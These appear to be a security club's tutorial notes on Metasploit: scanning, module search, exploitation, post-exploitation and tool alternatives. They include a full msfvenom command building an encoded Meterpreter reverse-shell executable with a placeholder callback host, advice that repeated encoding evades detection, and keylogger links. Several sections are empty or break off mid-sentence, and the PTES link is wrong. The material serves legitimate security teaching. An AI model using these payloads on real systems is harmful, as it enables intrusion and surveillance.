# Meeting 2: Metasploit
Goals:
We have 4-5 vulnerable machines set up

## Table of Contents
[Connecting to a database](#connecting-to-a-database)
[Scanning](#scanning)
[Exploitation](#exploitation)
        -[Choosing an exploit](#choosing-an-exploit)
        -[Searching](#searching)
        -[Using a search result](#using-a-search-result)
        -[Types of payloads](#types-of-payloads)
-[Post-Exploitation](#post-exploitation)
        -[What is Meterpreter?](#what-is-meterpreter)

## Metasploit
Metasploit is a widely used penetration testing framework that helps find, exploit, and validate vulnerabilities in systems. To open Metasploit, type `msfconsole` in the terminal.

### Connecting to a database
Metasploit can connect to a PostgreSQL database. To set up and initialize the database, run `msfdb init` in bash. After launching Metasploit with `msfconsole`, you can verify the database connection with the `db_status` command.

See [Metasploit Database](#metasploit-database) for more details.

Once connected to the database, you can view the vulnerabilities from your scan with `vulns`
### Scanning
The goal of scanning is to learn more about the machine, so you can plan your attack.

`db_nmap` will do an nmap scan and save the results in your metasploit database.

### Exploitation
The goal of exploitation is to use a vulnerability to access the machine. 

#### Choosing an exploit
##### Searching
Type `vulns` to view the vulnerabilities your scan found.

Now use the `search` command to figure out which metasploit modules can exploit what you found. 

To search for exploits on windows, you could type `search -t exploit -p windows`

`-t` is type. It can distinguish between metasploit's different offerinsgs, such as: `exploit, payload, post, auxiliary, encoder, nop`

Some other useful parameters:
+ `--cve` filter by CVE identifier
+ `-o` order the results. Can do it by `rank`, `name`, 
+ `author` to search by a particular author, i.e. `rapid7`

For example, to search by cve, type `search --cve CVE-2021-12345`

##### Using a search result
From the search results, to use the exploit labeled `0`, type `use 0`

Then type `show options` to view what parameters need to be set.

To set a parameter, you can type `set <Parameter Name> <value>` and `unset <Parameter Name>`

#### Types of payloads
The exploit will get you onto the system. But what do you do once you get in? A simple payload is the 

### Post-Exploitation
Post-exploitation's goals are pretty open ended. You can try to maintain persistence, pivot around the network, etc.
This document has a lot of ideas: <http://www.pentest-standard.org/index.php/Post_Exploitation#File.2FPrinter_Shares>

#### What is Meterpreter

## Further Reading

- [Msf Venom](#msf-venom)
  - [Encoders](#encoders)
- [Auxiliary Metasploit Tools](#auxiliary-metasploit-tools)
  - [Fuzzers](#fuzzers)
  - [Sniffers](#sniffers)
  - [Fun Meterpreter Things](#fun-meterpreter-things)
    - [Screenshots](#screenshots)
    - [Keyloggers](#keyloggers)
- [Metasploit Database](#metasploit-database)
- [Nmap Alternatives](#nmap-alternatives)
- [Metasploit Alternatives](#metasploit-alternatives)

### Msf Venom
Use `-l` to list the payloads
```bash
msfvenom -l payloads
```

#### Encoders
```bash
msfvenom -l encoders
```

##### Example Command
```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -b "\x00" -e x86/shikata_ga_nai -i 5 -f exe > output.exe
```

###### Architecture
`-a x86`: Specifies the architecture of the payload. You can also try
+ `x64` For 64-bit systems.
+ `armle` For little-endian ARM systems.
+ `mipsbe` For big-endian MIPS systems.

###### Platform
`--platform Windows`: Specifies the platform of the payload. You can also try
+ `Linux`: For Linux systems.
+ `Android`: For Android devices.
+ `OSX`: For Apple’s macOS systems.

###### Payload
`-p windows/meterpreter/reverse_tcp`: Specifies the payload to generate.

###### LHOST
`LHOST=<Your IP>`: Sets the IP address for the payload to connect back to.

###### LPORT
`LPORT=<Your Port>`: Sets the port for your system to listen on.

###### Characters to avoid
`-b "\x00"`: Specifies a list of characters to avoid in the payload. Also can try: 

- `-b "\x00"`: Avoid characters in the payload.
- `\x00`: Null byte; terminates strings.
- `\x0A`: Line feed; can end commands in UNIX.
- `\x0D`: Carriage return; signals end of data in Windows.
- `\x20`: Space; can alter script or command behavior.

`-e x86/shikata_ga_nai`: Specifies the encoder to use on the payload.

###### Payload Format
See: `msfvenom --help-formats`

- `-f exe`: Windows executable format, ideal for direct execution on Windows systems.
- `-f elf`: ELF binary for Linux systems.
- `-f war`: Java Web Archive, targets Java-based server applications.
- `-f asp`: ASP script for older IIS servers.
- `-f php`: PHP script for web servers supporting PHP execution.
- `-f python`: Python script for systems with Python available.
- `-f js_be`: JavaScript for browser exploit scenarios.
- `-f raw`: Raw shellcode for direct injection or exploit development.
- `-f dll`: Windows Dynamic Link Library, suitable for DLL injection/hijacking.

- `-i 5`: Specifies the number of times to encode the payload. Multiple encodings help evade simple detections, but overdoing can bloat the payload. Typically, 2-5 iterations balance evasion and size. Five offers obfuscation without excessive bloating.

### Auxiliary Metasploit Tools

#### Fuzzers

#### Sniffers

#### Fun Meterpreter Things
##### Screenshots
##### Keyloggers
<https://www.yeahhub.com/use-keylogger-in-metasploit-framework/>

<https://www.hacking-tutorial.com/hacking-tutorial/5-step-using-metasploit-meterpreter-keylogger-keylogging/>

### Metasploit database
Metasploit uses a PostgreSQL database by default. You can run it with `msfdb init`. You can confirm you are connected to the database by running `db_status` inside metrepreter.
More information can be found here: <https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html> 

Some common commands:

- **Workspace Management**:
  - `workspace`: Lists all workspaces.
  - `workspace [name]`: Switches to or creates a new workspace.
  
- **Host Management**:
  - `hosts`: Lists all hosts.
  - `hosts -d [ip]`: Deletes a specific host.
  
- **Service Management**:
  - `services`: Lists all services.
  
- **Vulnerability Management**:
  - `vulns`: Lists vulnerabilities.
  
- **Note Management**:
  - `notes`: Manages associated notes.
  
- **Credential Management**:
  - `creds`: Lists credentials (usernames/passwords).
  
- **Data Export**:
  - `db_export`: Exports data (XML, CSV, etc.).

- **Data Import**:
  - `db_import`: Imports data from various sources.

- **Database Connection**:
  - `db_connect`: Connects to a database.
  - `db_disconnect`: Disconnects from the current database.

- **Session Management**:
  - `background`: Puts the current session in the background.

### Nmap Alternatives
Nmap is useful for discovering devices on a network and finding open ports.

Tools like Nessus and Greenbone are used for vulnerability scanning.
Nessus vs Greenbone: <https://youtu.be/sEzN2U4Pqcs?si=f6bNdr_va-hGAz1D>

### Metasploit Alternatives
Metasploit is free. These are some more useful tools to look into. Some are paid.

1. [MITRE ATT&CK](https://attack.mitre.org/): A knowledge base curated by MITRE, detailing adversary tactics, techniques, and procedures. It provides insights into the various steps and methods adversaries might use during an attack.

2. [Cobalt Strike](https://www.cobaltstrike.com/): A commercial post-exploitation tool providing advanced red team operations and adversary simulations. It offers a range of covert techniques and tactics.

3. [PTES (Penetration Testing Execution Standard)](https://csrc.nist.gov/pubs/sp/800/115/final): A structured methodology detailing the stages of penetration testing, from initial communication and legalities to post-exploitation and reporting.

4. [OWASP](https://owasp.org/): The Open Web Application Security Project is a global non-profit focused on improving software security. It provides tools, standards, and documentation related to web application security, including the famous OWASP Top Ten list.

5. [NIST SP 800-115](https://csrc.nist.gov/pubs/sp/800/115/final): Published by the U.S. National Institute of Standards and Technology, this is a guide detailing the technical aspects of information security testing and assessments.

6. [Red Team Automation (RTA)](https://github.com/endgameinc/RTA): An open-source script collection that replicates various adversarial tactics and techniques. It's useful for validating detection and response capabilities.

7. [Atomic Red Team](https://atomicredteam.io/): An open-source testing framework that delivers small, focused tests based on MITRE's ATT&CK. It assists defenders in measuring their detection capabilities.

8. [CALDERA](https://caldera.mitre.org/): Developed by MITRE, CALDERA is a cyber adversary emulation system that automates the execution of post-compromise behaviors. It uses MITRE's ATT&CK knowledge base to plan and execute adversary operations.

9. [The Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html); A model by Lockheed Martin to describe stages of cyberattacks. It aids defenders in understanding and defending against complex threats.

10. [BloodHound](https://github.com/BloodHoundAD/BloodHound): A tool that employs graph theory to display hidden relationships within Active Directory environments. It's instrumental in identifying potential attack paths an adversary might exploit.

11. [Metasploit Pro](https://blog.parrot-pentest.com/metasploit-pro-vs-free-whats-better/): While Metasploit offers a free version, the Pro variant is a paid offering with advanced features tailored for penetration testers and enterprises. It includes benefits such as automated vulnerability scans, web application scanning, and enhanced reporting capabilities.






